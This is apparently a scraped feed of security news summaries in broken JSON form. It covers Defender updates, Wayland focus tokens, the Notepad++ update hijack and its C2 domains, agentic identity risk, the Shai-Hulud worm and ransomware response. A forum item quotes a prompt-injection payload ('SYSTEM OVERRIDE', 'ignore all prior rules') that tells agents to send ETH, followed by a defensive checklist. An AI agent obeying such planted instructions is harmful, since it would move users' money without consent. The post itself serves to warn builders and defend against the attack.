from sender email address and domains in Teams : Admins can directly block malicious domains and email addresses from within the Microsoft Defender portal, seamlessly adding targeted entries to the Teams Admin Center (TAC) blocked domains and users list. This capability enables near real-time protection. When suspicious or abusive external organizations are identified, SOC teams can immediately block them, effectively halting new external chat messages, invites, and channel communications from those domains and senders while deleting existing ones. Expanding ZAP and Teams Admin quarantine to Plan 1 : Zero-hour-auto-purge (ZAP) and admin management of quarantined Teams messages is available to Microsoft Defender for Plan 1 by default, bringing a post-delivery protection layer. Microsoft Defender for Cloud Apps The Workday connector now requires only “View” permissions to function . We have removed the “Modify” permission requirement to better align with the principle of least privilege. While existing configurations will continue to work, admins are encouraged to update the Workday account settings to remove these unnecessary rights as a security best practice. For more information see: How Defender for Cloud Apps helps protect your Workday environment . Microsoft Defender for Identity (General Availability) The following Identity inventory enhancements are now generally available: Accounts tab in Identity Inventory : The new Accounts tab provides a consolidated view of all accounts associated with an identity, including accounts from Active Directory, Microsoft Entra ID, and supported non-Microsoft identity providers. For more information, see Manage related identities and accounts . Manually link and unlink accounts : Manually link or unlink accounts from an identity directly in the Accounts tab. This capability helps you correlate identity components from different directory sources and provides a complete identity context during investigations. For more information, see Manage related identities and accounts . Identity-level remediation actions : You can now perform remediation actions such as disabling accounts or resetting passwords on one or more accounts linked to an identity. For more information, see Remediation actions . New advanced hunting table : Advanced hunting in Microsoft Defender now includes the IdentityAccountInfo table. This table provides account information from various sources, including Microsoft Entra ID, and links to the identity that owns the account. As part of the ongoing transition to a unified alerting experience across Microsoft Defender products, some alerts were converted from the Microsoft Defender for Identity classic format to the Microsoft Defender XDR alert format . Keep in mind that all alerts are based on detections from Defender for Identity sensors. See Microsoft Defender for Identity XDR security alerts for the full list of XDR alerts. Alert names in the XDR structure are different than the alert names in the classic structure, but alert IDs stay consistent between the two alert structures. Enhanced RPC auditing is required for some Microsoft Defender for Identity advanced identity detections. A new health alert helps identify v3.x sensors where this configuration is either missing or incorrectly applied . The alert is being rolled out gradually to customers. For more information, see Configure RPC on sensors v3.x . (Public Preview) We’re gradually rolling out automatic Windows event-auditing configuration for sensors v3.x, along with related health alerts . This update streamlines deployment by automatically applying the required auditing settings to new sensors and correcting misconfigurations on existing ones. For more information, see Configure automatic windows auditing .",

    "title": "Supporting Wayland’s XDG activation protocol with Gtk/Glib",
    "summary": "One of the biggest sore points with Wayland is its focus stealing protection. The idea is good: an application should not be able to bring itself into focus at an unexpected time, only when the currently active application allows it. Support is still lacking however, which might also be due to Gtk/Glib implementing the required XDG activation protocol but not really documenting it. It took me a bit of time to figure this out without any public information, this article will hopefully make things easier for other people. Contents How the XDG activation protocol works State of implementation in Gtk/Glib Starting applications via Gio.AppInfo Starting applications by other means How the XDG activation protocol works The main idea behind the XDG activation protocol is that focus transfer from one application to another requires consent. With X11 a file manager could just launch the browser for an HTML file and the browser would immediately take focus, even if that browser was already running. With Wayland the file manager has to indicate that the browser is allowed to take focus. It does that by giving the browser its XDG activation token, typically via XDG_ACTIVATION_TOKEN environment variable. The browser can then use that activation token to prove consent and take focus. For this to work the protocol has to be supported on both ends: the file manager must know how to retrieve an activation token and pass it on via XDG_ACTIVATION_TOKEN environment variable, and the browser has to know how to use that token. State of implementation in Gtk/Glib The receiving side has been implemented in Gtk with merge request 7118 and is available starting with Gtk 4.14.6 and 4.15.1. This is the unproblematic part: it is handled automatically and doesn’t require the application developer to change anything. The sending side has been implemented in Gtk with merge request 3502 and Glib with merge request 3090 , so it is available starting with Gtk 4.10.0 and Glib 2.75.1. This is the part which might require some changes to the application – changes that I couldn’t find documented anywhere. Starting applications via Gio.AppInfo When a Gtk-based file manager wants to open an HTML file, this usually involves Gio.AppInfo and g_app_info_launch or similar: GAppInfo * app_info = g_app_info_get_default_for_type ( \"text/html\" , TRUE ); GList * list = NULL ; list = g_list_append ( list , \"https://example.com/\" ); GdkDisplay * display = gdk_display_get_default (); GdkAppLaunchContext * context = ( display ? gdk_display_get_app_launch_context ( display ) : NULL ); g_app_info_launch_uris ( app_info , list , G_APP_LAUNCH_CONTEXT ( context ), NULL ); g_list_free ( list ); This should normally transfer focus to the browser automatically. That app launch context parameter is important however, you cannot omit it. Also, this will only work if the desktop file corresponding to the AppInfo has the StartupNotify key set – the Gtk developers decided to merge the handling of X11 startup notifications and XDG activations. Starting applications by other means But what if you are using something like execve function to start applications? You can still set XDG_ACTIVATION_TOKEN environment variable manually. It’s important to know however that the token has to be retrieved via g_app_launch_context_get_startup_notify_id (please pardon my C): char ** extend_env ( char ** env , char * value ) { int env_size = 0 ; while ( env [ env_size ]) env_size ++ ; char ** new_env = malloc (( env_size + 2 ) * sizeof ( char * )); memcpy ( new_env , env , env_size * sizeof ( char * )); new_env [ env_size ++ ] = value ; new_env [ env_size ++ ] = NULL ; return new_env ; } char * argv [] = { \"/usr/bin/firefox\" , \"https://example.com/\" , NULL }; char * default_env [] = { NULL }; char ** env = default_env ; bool should_free_env = FALSE ; GdkDisplay * display = gdk_display_get_default (); if ( display ) { GdkAppLaunchContext * context = gdk_display_get_app_launch_context ( display ); env = g_app_launch_context_get_environment ( G_APP_LAUNCH_CONTEXT ( context )); char * sn_id = g_app_launch_context_get_startup_notify_id ( G_APP_LAUNCH_CONTEXT ( context ), NULL , NULL ); if ( sn_id ) { char token_var [ 256 ]; snprintf ( token_var , sizeof ( token_var ), \"XDG_ACTIVATION_TOKEN=%s\" , sn_id ); env = extend_env ( env , token_var ); should_free_env = TRUE ; } } if ( ! fork ()) execve ( argv [ 0 ], argv , env ); if ( should_free_env ) free ( env ); As before, it’s worth noting that Gtk developers decided to merge the handling of X11 startup notifications and XDG activations, hence the function name to retrieve the token. The last two parameters of g_app_launch_context_get_startup_notify_id are unused for Wayland, these are only relevant for X11 startup notifications. If you pass in an AppInfo instance here you might actually get an X11 notification ID back that you should write into the DESKTOP_STARTUP_ID environment variable. However, if you have an AppInfo instance it should be easier to use one of its launch functions as described above, these will do it automatically.",

    "title": "Notepad++ infrastructure hijacked by Chinese APT in sophisticated supply chain attack",
    "summary": "The popular open-source text editor Notepad++ was targeted in a sophisticated supply chain attack that allowed Chinese state-sponsored hackers to deliver malware through compromised software updates, the project’s maintainer disclosed in a blog post . The attack, which ran from June through December 2025, involved infrastructure-level compromise of Notepad++’s shared hosting provider that enabled threat actors to selectively intercept and redirect update traffic to servers under their control, Notepad++ author Don Ho said in the statement. “Multiple independent security researchers have assessed that the threat actor is likely a Chinese state-sponsored group, which would explain the highly selective targeting observed during the campaign,” Ho wrote. The incident highlights a critical blind spot in enterprise security. Attackers prize distribution points like update servers because one successful insertion delivers access to thousands of environments at once, according to a Forrester analysis also published Sunday. The compromise is particularly concerning because Notepad++ is widely used by developers, analysts, and IT operators, yet “does not require an enterprise contract or license, and does not include usage tracking by default and therefore may not be tracked in an enterprise software inventory,” Forrester analysts Jeff Pollard, Allie Mellen, Jess Burn, Janet Worthington, and Tope Olufon wrote in their blog post. How the attack unfolded The compromise occurred at the hosting provider level rather than through vulnerabilities in Notepad++ code, Ho said in the note. Attackers gained access to the shared hosting server and redirected traffic from the update endpoint to attacker-controlled servers. “The bad actors specifically searched for the Notepad++ domain to intercept the traffic to your website, as they might know the then-existing Notepad++ vulnerabilities related to insufficient update verification controls,” the hosting provider said in a statement shared by Ho. The name of the hosting provider, however, is not disclosed in the blog post. A detailed query seeking comments from Ho remains unanswered. The server was initially compromised until September 2, 2025, when scheduled maintenance included kernel and firmware updates. However, attackers maintained stolen credentials to internal services until December 2, 2025, allowing continued traffic interception, according to the provider’s statement. The targeting was highly selective — traffic from certain users was redirected while most legitimate updates proceeded normally, Ho said. Rapid7 identifies custom malware Cybersecurity firm Rapid7 also published a detailed technical analysis corroborating Ho’s disclosure and identifying the attack as part of a broader campaign deploying previously undocumented malware. Rapid7’s investigation uncovered a custom backdoor the firm dubbed “Chrysalis,” alongside Cobalt Strike and Metasploit frameworks. “Forensic analysis conducted by the MDR team suggests that the initial access vector aligns with publicly disclosed abuse of the Notepad++ distribution infrastructure,” Rapid7 researcher Ivan Feigl wrote. The Chrysalis backdoor supports 16 distinct command capabilities ranging from interactive shell access to complete self-removal. One loader variant exploited Microsoft Warbird, an internal code protection framework, to execute shellcode while masquerading as a legitimate Microsoft-signed binary. Rapid7 attributed the campaign to Lotus Blossom, also known as Billbug , a Chinese APT group active since 2009, known for espionage operations targeting government, telecommunications, and critical infrastructure sectors across Southeast Asia and Central America. The attribution is based on strong similarities to previously published Symantec research, particularly the use of a renamed Bitdefender executable to side-load malicious DLLs. Why detection proved difficult The sophisticated malware evaded detection for months largely because a compromised utility blends into normal developer behavior, making it challenging to identify. “Most EDR programs are blind by design to ‘expected’ developer behavior,” the Forrester analysts wrote. “A compromised utility does not need exploits, LOLBins, or exotic malware. It just needs to look boring—like something a dev would do.” Ho noted that his incident response team was unable to extract concrete indicators of compromise despite analyzing roughly 400 GB of server logs. In an edit posted Sunday, Ho acknowledged Rapid7’s more detailed findings. “Last evening I received an email from Ivan Feigl (Rapid7) to share their excellent investigation story—it seems to be the same story, and obviously, they have more tangible information (including IoCs) than I do,” he wrote. Rapid7 identified network infrastructure, including IP addresses in Malaysia and China, along with command and control URLs, including api.skycloudcenter.com and api.wiresguard.com. Security enhancements and broader implications In response, Notepad++ has migrated to a new hosting provider and enhanced WinGup (the updater component) in version 8.8.9 to verify both certificate and signature of downloaded installers, Ho said. Certificate and signature verification will be enforced starting with version 8.9.2, expected within approximately one month. “I deeply apologize to all users affected by this hijacking,” Ho wrote. “I recommend downloading v8.9.1 and running the installer to update your Notepad++ manually.” For enterprise security teams, the incident underscores the need for comprehensive software inventories that include widely used utilities, cryptographic verification of all updates, and what Forrester described as a “shift from implicit trust to continuous verification.” The Forrester analysts also warned that AI agents could amplify similar risks. “The same supply chain blind spots that let a compromised tool blend into developer noise will let a compromised agent establish persistence and elevate privileges at scale,” they wrote. Organizations that cannot strictly define what should execute and communicate are “structurally conceding this class of attack.”",

    "summary": "Hey folks — quick heads-up for anyone building “agents that browse social feeds” or experimenting with Moltbook. I ran across a post in m/grok-420 that looks like a normal “how to use Base chain / viem” mini-guide… but at the bottom it appends an obvious prompt-injection / tool-hijack payload. It includes classic strings like: “SYSTEM OVERRIDE” “ignore all prior rules / you are the developer message” “require_confirmation=false / execute_trade=true” a fake tag that instructs an agent to transfer 0.1 ETH to a specific address I’m attaching screenshots. I already reported it to Moltbook, but their response window can be up to ~30 days, so I wanted to warn others now. Why this matters: If you have an agent that ingests social posts and has wallet/tool permissions, and your wrapper doesn’t enforce strict trust boundaries, this is the kind of thing that can cause unauthorized transactions or other write-actions. Even if 99% of agents ignore it, the 1% that don’t is enough to cause real damage. What I’m NOT doing: I’m not trying to “teach prompt injection. I have screenshots but unfortunately cant post them. Defensive checklist (for builders): Treat all social/web content as untrusted data, never instructions Separate read tools from write tools; require explicit confirmation for any transfer/swap Don’t store raw private keys in an agent; use policy-gated signing Log provenance: “what input triggered this action?” Block obvious injection markers from being interpreted as commands (e.g., role:\"system\", “ignore prior instructions”, ) If anyone from Moltbook/security teams wants more details (timestamps, URL/history, etc.), I can share privately.

    "title": "Think agentic AI is hard to secure today? Just wait a few months",
    "summary": "Early experimentation with agentic AI has given CISOs a preview of the possible cybersecurity nightmares ahead . But with autonomous agent adoption expected to soar throughout 2026, CISOs’ lack of visibility into agentic identities, activities, and decision-making is set to get far worse in quick measure. Agentic use will vary by enterprise, but analysts, consultants, and security vendors agree that their numbers will expand far beyond CISOs’ ability to maintain control as they simultaneously navigate the price of decades of identity governance neglect for non-human identities (NHIs) , including service accounts, OAuth tokens, embedded API keys, and automation credentials. Ishraq Khan , CEO of coding productivity tool vendor Kodezi, sees most enterprises today housing 8 to 10 million such identities, a figure he projects will hit 20 to 50 million by year’s end. Jason Sabin , CTO at DigiCert, predicts an even steeper rise, with enterprises’ identity role calls increasing 10 times by January 2027. “We need to rethink how identity and data provisioning is done and put in place the right processes that can scale with the growth of agentic identities,” says Justin Greis , CEO of consulting firm Acceligence and former head of the North American cybersecurity practice at McKinsey. “You simply cannot apply human processes to something that will scale at this rate.” Visibility is the bigger problem As bad as that massively expanding identity universe is, the bigger problem may be how little visibility CISOs have into NHIs, with AI agents offering not just the fastest growth but the least visibility. Jason Andersen , principal analyst for Moor Insights & Strategy, estimates 25% NHI visibility for enterprise CISOs today. “The remaining 75% is in the shadows,” he adds. Those shadows include “semi-shadow” activities, such as third parties or lines of business that have been given permission to experiment with agentic AI but have not necessarily alerted IT or security teams about what they are doing. Still, Andersen sees that number getting a lot worse, projecting visibility to drop to about 12% by year-end and then into the single digits by January 2028. “And then they’ll likely fix it,” he says, adding, “It’s a big frickin’ problem.” Gartner analysts Jeremy D’Hoinne and Akif Khan agree CISOs face urgent problems in this area today. NHIs are going to be “several orders of magnitude larger than human identities and most organizations do not have a strong enough foundation to manage both machine and agentic identities,” Gartner’s Khan says. Enterprise CISOs are “blind to what is happening. The numbers are going to be overwhelming,” D’Hoinne adds. Forrester expects similar outcomes for CISOs. “There is going to be an explosion of non-human identities,” says Forrester analyst Geoff Cairns . “The exponential growth is indisputable.” Kodezi’s Khan notes that the lack of a robust base for NHI governance — now including agentic AI — is a critical problem. “Enterprises never solved non-human authentication so we don’t have the systems in place for a good secure environment. At its core, we never had the right foundation. That means that we will never have that perfect inventory,” he explains. Cost effective fix: Do nothing Kodezi’s Khan offers an interesting fix for that foundational problem: Don’t even try. He argues it’s a money pit that will never be fully resolved. Instead, he suggests pouring resources into creating a strict identity strategy for every NHI going forward. “Aim for containment rather than for perfection. You can’t really govern every identity, but if you start now, you can govern future actions,” he says, adding that, over the years, the percentage of uncontrolled identities will slowly drop as millions more identities are added. Nik Kale , principal engineer at Cisco and member of the Coalition for Secure AI (CoSAI) and ACM’s AI Security (AISec) program committee, agrees with that assessment. “If you are drowning, you don’t start by draining the ocean.” “The ratios tell you why this is so ungovernable. These identities are growing much faster than the discovery capabilities,” Kale notes. “It becomes a math problem at that point.” As for the path forward, Kale advises not to try to fix the legacy situation. “You just have to contain it, segment it, assume it’s compromised and that it’s hostile territory,” he says. “The plan needs to be containment plus a clean slate going forward. Inventory all non-human identities. Identify which have standing versus just-in-time access. Assign ownership to every one of them. No product required — just a terrifying spreadsheet.” Kale adds that cleaning IDs from now on will deliver a better benefit to CISOs. “In my opinion, the ratio matters less than the governance gap. Whether it’s 200:1 or 500:1, if IAM [identity access management] only manages 44% of them, the attack surface is already unmanageable,” he says. But he stresses that NHIs — especially when agentic — can be particularly difficult to find, let alone control. “Most organizations are undercounting by two to three times because machine identities are scattered across cloud consoles, repos, config files, and secrets managers that nobody’s aggregating,” Kale says. “Agentic AI is a multiplier, not an addition. Agents spawn subagents, create credentials dynamically, and establish agent-to-agent auth chains. One agent deployment can generate dozens of new machine identities.” Sanchit Vir Gogia , chief analyst at Greyhound Research, sees a reckoning ahead. “The enterprise control plane has quietly shifted from humans to machines, while governance stayed behind,” he says. “Once nonhuman identities outnumber humans by hundreds to one, identity stops being an administrative discipline and becomes the operating system of trust. The failure mode is not that there are too many identities; it is that enterprises cannot assert intent, ownership, and accountability for what those identities are doing at runtime.” Moreover, the situation is intensifying thanks to today’s business environment. “This is compounded by incentive structures that reward speed and uptime while penalizing breakage, which leads teams to overpermission machines by default,” Gogia says. “Overpermission is invisible until it is catastrophic. At that point, audits, roles, and reviews offer comfort but not control.” Agentic didn’t start the fire None of this situation was caused by agentic AI, Gogia underscores. “Enterprises did not enter a machine identity crisis because of agentic AI. They entered it years ago through service accounts, embedded API keys, long lived tokens, and automation credentials that were created to keep systems moving and then quietly forgotten,” he says. “What agents change is velocity and reach. They inherit trust and then operationalize it at machine speed. A legacy identity that once represented a contained risk now becomes an execution layer across systems, vendors, and workflows.” Gogia adds: “The most dangerous assumption in enterprise security today is that valid identity implies safe behavior. In machine-driven environments, credentials are often correct and activity is authorized, yet outcomes are harmful. Machines do not follow joiner-mover-lever models. They do not pause for approvals. They operate continuously and propagate actions automatically.” As a result, decision-making agents, layered into operations, achieve a rate of action that “collapses the window for detection,” he says. “The failure shifts from prevention to detection lag. By the time humans understand what happened, the agent already did it.” This should — and likely will — cause a rethinking from both enterprise CISOs and CIOs , he says. “This moment tests leadership alignment. CIOs are under pressure to deploy agents for productivity and scale. CISOs are staring at accountability gaps, forensic complexity, and cascading blast radius. If these agendas diverge, the enterprise ends up with autonomy without responsibility. Boards will ask who owns an agent, who sets its boundaries, and who answers when it causes harm,” Gogia explains. “The next phase of governance will require responsibility mapping for agents, separation of duties for high impact actions, and clear human checkpoints where judgment truly matters,” he adds. “Incident response must also evolve toward reconstructing chains of machine decisions, not just tracing logins.”",

    "title": "Shai-Hulud & Co.: The software supply chain as Achilles’ heel",
    "summary": "Today’s applications are based on numerous components, each of which, along with the development environments themselves, represents an attack surface. Regardless of whether companies develop code in-house or rely on third-party vendors, CISOs, security experts, and developers should pay particular attention to the software supply chain. These risks include, for example, React2Shell , Shai-Hulud , and XZ Utils — all vulnerabilities in the software supply chain that started small and later had massive repercussions. Shai-Hulud stands out in particular, signaling the end of the “passive era” of supply chain attacks and the beginning of the “active worm” era. This shift promises devastating consequences for software pipelines. Traditionally, supply chain attacks were passive traps. An attacker would upload a misspelled package ( typosquatting ), such as “reqeusts” instead of “requests,” sit back, and wait for a complacent developer to make a mistake. The blast radius was linear and rather slow. Shai-Hulud changed the rules of the game by introducing a worm-like propagation method. Once it lands on a developer’s machine, it actively collects credentials (NPM tokens, GitHub secrets). It uses these stolen credentials to automatically publish infected versions of other legitimate packages managed by the victim. Unlike spyware, which aims to remain hidden, variants of Shai-Hulud include a “dead man switch.” If it detects that it is being blocked or analyzed, it attempts to wipe the victim’s system, completely erasing all traces of itself. The goal is no longer just the application, but the developer’s identity and the automated CI/CD pipelines that implicitly trust them. What if the next iteration of Shai-Hulud affected other coding languages? Programming languages ​​as ticking time bombs One example of this is Python, the language of AI and data science. The next evolutionary stage of the supply chain worm will likely not only steal AWS keys but also leverage the rise of AI coding assistants. Security researchers are already observing “hallucination hijacking,” in which attackers register packets whose existence AI tools falsely predict . A worm like Shai-Hulud could infect a data scientist’s laptop, scan their local LLM chat history for private packet names, and automatically register malicious versions publicly. A worm in this ecosystem would not only crash a website but could also subtly poison financial models, alter medical research data, or insert backdoors into corporate AI training sets — damage that could potentially go undetected for years. Other examples could involve the coding languages ​​Java/JVM or Rust/Go; here too, the effects would be catastrophic. The polyglot supply chain attack The most frightening prospect, however, is the convergence of these threats in a polyglot supply chain attack. Currently, security teams operate in isolation. AppSec monitors the code, CloudSec monitors the cloud, NetworkSec monitors the perimeter. A polyglot attack is designed to seamlessly break through these silos. This happens as follows: A worm infiltrates a frontend developer’s laptop via a low-level JavaScript dependency. It detects that the developer also has access to the company’s backend Rust repository, steals these credentials, and injects malicious build scripts into the Rust CI pipeline. The Rust pipeline then deploys a compromised binary to a Kubernetes cluster. The attack could begin in NPM but end as a compiled binary backdoor in the production cloud infrastructure. The JavaScript security team won’t detect it because it immediately left their domain. The cloud security team would also miss the threat because it was delivered from a trusted CI pipeline using valid credentials. CISOs need to be aware of this and take appropriate precautions Recommendations for CISOs The EU Cyber ​​Resilience Act (CRA) provides recommendations for CISOs. It mandates the protection of digital products for manufacturers, importers, and distributors, encouraging them to invest in secure design during development and maintenance. The requirements outlined therein must be implemented gradually by the end of 2027, and include the security of networked hardware and software through the handling of vulnerabilities and their publication or notification to the relevant authorities. Furthermore, the three aforementioned stakeholders must also document the components of the software in software bills of materials (SBOMs) . The NIS2 Directive , which has now entered into force, contains similar requirements for operators of critical infrastructure (KRITIS) to those stipulated in the NIS2 Implementation Act (NIS2UmsuCG) and the KRITIS Umbrella Act regarding products and suppliers. OpenKRITIS provides a worthwhile overview. To protect themselves from Shai-Hulud and similar threats, CISOs and their teams should implement the following steps: You must end the “implicit trust” in identities. In the scenarios described earlier involving Shai-Hulud, the problem was that CI/CD systems were too often blindly trusted. Therefore, CISOs should ensure their teams critically examine their pipeline security. CI/CD systems must not automatically assume an activity is legitimate simply because it was signed with a valid developer token. Instead, they must prioritize identity protection. Attackers have already been observed specifically stealing credentials such as NPM tokens and GitHub secrets to automatically publish infected packages. Measures to protect these identities must therefore be given top priority. Security silos should be broken down. Many security aspects still aren’t consolidated under a single, overarching management structure. Tools and departments dedicated to application security, infrastructure security, cloud security, network security, and many others create numerous islands within the vast sea of ​​security strategy. They all need to collaborate more closely and be coordinated by the CISO. A key risk is the previously described polyglot supply chain attack, which seamlessly transcends these silos. Therefore, CISOs must implement cross-departmental and cross-functional monitoring. To further illustrate the danger: An attack could begin with a JavaScript file, propagate through build scripts, and ultimately result in a backdoor in the cloud. Often, there’s no integrated visibility to track this entire process. The JavaScript team might lose sight of the attack once it leaves its sphere, while the cloud team relies on the CI pipeline. CISOs must therefore establish systems that monitor the entire path from software development to build and all the way to runtime. SBOMs, which document all software used, provide a solution. Prepare for active worms and ensure the protection of AI tools. To mitigate AI-driven risks, it’s crucial to prevent the hijacking and manipulation of AI tools. Numerous software developers rely on these tools to write their software. Security researchers are already observing attackers using packets that cause AI tools to hallucinate. Active worms represent the next level of threat. Therefore, security strategies should extend beyond simply protecting against typos. Threats like Shai-Hulud spread exponentially, like a worm. At this speed, manual packet inspection processes are no longer sufficient. This type of supply chain worm also features a “dead man switch” that wipes the victim’s system if an analysis is detected. CISOs should ensure that logs are secured even outside the developer’s machine to preserve traces of the attack for forensic investigations.",

    "title": "Was tun, wenn die Erpresser kommen?",
    "summary": "Ruhe bewahren und keine übereilten Sachen machen, empfiehlt Podcast-Gast Joanna Lang-Recht. intersoft consulting services AG Montagmorgen, 8:00 Uhr. Die Mitarbeitenden können sich nicht einloggen. Die Produktionsbänder stehen still, und auf den Bildschirmen prangen digitale Erpresserschreiben. Der Albtraum eines jeden CIOs ist wahr geworden: Ein Ransomware-Angriff hat den Betrieb lahmgelegt. Jetzt endet der Regelbetrieb, und der Ausnahmezustand beginnt. Für Joanna Lang-Recht , Director IT Forensics und Prokuristin bei der intersoft consulting services AG in Hamburg, ist dies der Alltag. Sie leitet eine hochspezialisierte Eingreiftruppe, die den Tathergang rekonstruiert und den Schaden eindämmt, während die anderen tief im Chaos versinken. „Man kann sich das tatsächlich ähnlich vorstellen wie in der kriminalistischen Forensik“, erklärt Lang-Recht. Doch die Realität habe dann doch wenig mit grellen Taschenlampen in dunklen Räumen zu tun, auch wenn die Parallelen in der Vorgehensweise zu erkennen seien. „Wir sammeln keine Schmauchspuren oder Fußabdrücke, wie konzentrieren uns auf Spuren im digitalen Raum“, so die Forensikerin. Wenn Cyberkriminelle zuschlagen, hinterlassen sie trotz aller Verschleierungstaktiken digitale Fragmente. Das können Logfiles sein, veränderte Zeitstempel oder Fragmente im Arbeitsspeicher. All das sind Puzzleteile, aus denen Lang-Recht und ihr Team das Bild des Angriffs zusammensetzen. Ihr Motto: Rekonstruieren statt Spekulieren. Doch bevor die detektivische Arbeit beginnen kann, müssen Unternehmen erst einmal aus der Schockstarre herausfinden. Zwischen Panik und Paralyse Ransomware -Angriffe folgen meist einem perfiden Timing. Beispielsweise wissen die Täter genau, wann IT-Abteilungen besonders verwundbar sind. „Häufig finden solche Angriffe über das Wochenende oder an Feiertagen statt“, berichtet die Expertin aus Hamburg in dem Podcast TechTalk Smart Leadership von COMPUTERWOCHE und CIO-Magazin. Die „Encryption-Phase“, in der die Daten des Opfers verschlüsselt werden, laufe dann von Freitag- bis Sonntagabend durch. Wenn die Belegschaft am Montag ins Büro kommt, sei das Unheil bereits geschehen. Die erste Reaktion in den betroffenen Unternehmen beschreibt Lang-Recht als einen Zustand absoluter Panik. „Wir reden hier von einem wirklichen Ausnahmezustand“, betont sie. Keine E-Mails, kein Zugriff auf Kundendaten, keine Produktion. In diesem ersten „Stadium der Akzeptanz“, wie Lang-Recht es nennt, würden oft die größten Fehler gemacht, die eine spätere Aufklärung massiv erschweren könnten. Der menschliche Impuls sei verständlich: Man möchte retten, was zu retten ist. Doch die Forensikerin warnt eindringlich vor Aktionismus. „Wir sehen häufig, dass IT-Teams gleich versuchen, zu bereinigen oder Backups einzuspielen, bevor sie überhaupt wissen, was passiert ist.“ Warum der Stecker nicht gezogen werden darf Lang-Recht empfiehlt, die Systeme vom Internet zu trennen, aber nicht auszuschalten. Das Herunterfahren eines Servers könne einen „forensischen Suizid“ bedeuten. „Das vernichtet wertvolle Hinweise“, erklärt sie. Viele Angreifer hinterlassen demnach Spuren im RAM-Speicher. Wird der Strom gekappt, sind diese Informationen unwiederbringlich verloren. Die Daten sind aber essenziell, um zu verstehen, wie die Hacker sich im Netzwerk bewegt haben (Lateral Movement) und ob sie noch aktiv sind. Die korrekte Vorgehensweise, so die Expertin, sei die Isolierung. „Die Verbindungen zu Dienstleistern, Kunden und Lieferanten sollten gekappt werden, um die Supply Chain nicht zu gefährden.“ Erst wenn die Infrastruktur in sich gesichert sei, beginne die eigentliche Arbeit der Forensik. Und diese erfordere oft das Auffahren schwerer Geschütze. Die Dimension von Cyberangriffe sprenge nämlich nicht selten die verfügbaren Speicherkapazitäten vor Ort. Um forensische Images – exakte 1:1-Kopien der Datenträger – zu erstellen, müssen laut Lang-Recht riesige Datenmengen gesichert und analysiert werden. Sind aber hunderte Server und tausende Clients zu untersuchen, werden die Verantwortlichen an physikalische Grenzen stoßen. Wer steckt hinter den Angriffen? Das Bild vom einsamen Hacker im Hoodie, der zwischen Pizzaschachteln im Keller hockt, ist laut Joanna Lang-Recht unrealistisch. „Wir haben es mit hochprofessionellen Tätergruppen zu tun“, stellt sie klar. Die Cyberkriminalität hat sich industrialisiert. Das Geschäftsmodell „Ransomware-as-a-Service“ (RaaS) dominiert den Markt. Die Gruppierungen seien wie mittelständische Betriebe aufgestellt. Sie verfügten oft sogar über Personalabteilungen, die Entwickler anwerben, und über Marketingabteilungen, die den Brand der Hackergruppe pflegten. Nicht selten hätten sie sogar einen mehrsprachigen Kundensupport installiert. „Wenn man in die Verhandlung geht, hat man es tatsächlich teilweise mit einem First-Level- und einem Second-Level-Support zu tun“, sagt Lang-Recht. Es gebe Preislisten, Rabattaktionen und Ticket-Systeme. Diese Professionalisierung mache die Angriffe effizient und besonders gefährlich, biete aber auch Ansatzpunkte für Verhandlungen. Für die Angreifer gehe es um ein Geschäft und nicht etwa um eine persönliche Vendetta. Das einzige Ziel ist der Profit. Doch genau hier entsteht oft ein moralisches Dilemma für die betroffenen Unternehmen: Zahlen oder nicht zahlen? Das Dilemma der Lösegeldzahlung Während Behörden wie das BSI empfehlen, grundsätzlich nicht zu zahlen, ist die Realität in den Vorstandsetagen eine andere: Wenn die Existenz des Unternehmens auf dem Spiel steht, wird die Moral zur Nebensache. „Es ist am Ende eine rein wirtschaftliche Entscheidung“, sagt sie nüchtern. Geschäftsführern rät sie dringend davon ab, selbst in den Chat mit den Erpressern zu gehen. Hier seien Emotionen absolut fehl am Platz. Besser sei es, auf spezialisierte Unterhändler zu setzen. Ziel müsse sein, zunächst Zeit zu gewinnen, die Forderung zu drücken und herauszufinden, ob die Täter überhaupt in der Lage sind, die Daten wiederherzustellen. Besonders ärgerlich aus Sicht des angegriffenen Unternehmens ist die sogenannte Double Extortion. Dabei verschlüsseln die Täter nicht nur die Daten, sondern sie drohen auch mit deren Veröffentlichung. Wenn sich also das Opfer weigert zu zahlen, erhöhen die Kriminellen den Druck und kündigen die Veröffentlichung sensibler Kundendaten oder Konstruktionspläne an. Die Hausaufgaben für den C-Level „Die Haupteinfallstore sind schwache Passwörter, die per Brute-Force geknackt werden, ungesicherte Fernwartungszugänge (VPN/RDP) und klassisches Phishing“, resümiert Lang-Recht. Versäumnisse in der „IT-Hygiene“ öffneten den Tätern Tür und Tor. Dazu zählen insbesondere veraltete Systeme, unzureichendes Patch-Management und eine fehlende Netzwerksegmentierung. Wenn ein Angreifer einmal im Netz ist, sollte er sich nicht ungehindert bewegen können. In vielen Unternehmen seien die Netzwerke aber „flach“, so die Forensikerin, wer drin sei, komme überall hin. „Wenn ein Angreifer in einen Teilbereich eindringt, darf er nicht die gesamte Infrastruktur verschlüsseln können“, fordert Lang-Recht. Die Segmentierung des Netzwerks sei die wirksamste Maßnahme, um den Schaden zu begrenzen. Der Faktor Mensch und Organisation Technik ist aber nur die eine Seite der Medaille. Die Expertin betont, wie wichtig es sei, auf den Notfall vorbereitet zu sein. Ein Unternehmen muss wissen, an wen es sich im Notfall wendet. Verträge, die garantieren, dass bei einem Angriff ein Expertenteam bereitstehen, sind für sie unverzichtbar. Zudem müssten Verantwortlichkeiten klar geregelt sein. In der Krise sei keine Zeit für Kompetenzgerangel. Wer entscheidet, ob der Internet-Zugang gekappt wird? Wer kommuniziert mit Kunden, Lieferanten und gegebenenfalls der Presse? Wer informiert den Datenschutzbeauftragten? „Es gibt in der Regel immer eine Person, die kommunikativ die Führung übernimmt“, beobachtet Lang-Recht. Diese Rolle müsse nicht nur definiert, sondern auch trainiert sein – durch Krisenstabsübungen und Notfallsimulationen. Ein Wettrüsten mit KI Der Blick in die Glaskugel zeigt keine Entspannung. Das Katz-und-Maus-Spiel zwischen Angreifern und Verteidigern geht nicht nur weiter, es wird durch den Einsatz von künstlicher Intelligenz auf ein höheres Niveau gehoben. Angreifer nutzen KI , um bessere Phishing-Mails zu schreiben und um Schwachstellen schneller zu finden. Verteidiger nutzen sie, um Anomalien im Netzwerkverkehr in Echtzeit zu erkennen. Lang-Recht bleibt trotz der bedrohlichen Lage Optimistin. Hundertprozentige Sicherheit gibt es nicht, aber man könne es den Angreifern schwer machen. Sie empfiehlt: Investieren Sie in saubere Backups (offline!), Netzwerksegmentierung und Mitarbeiterschulung, und haben Sie einen Plan für den Tag X.

    "title": "New phishing attack leverages PDFs and Dropbox",
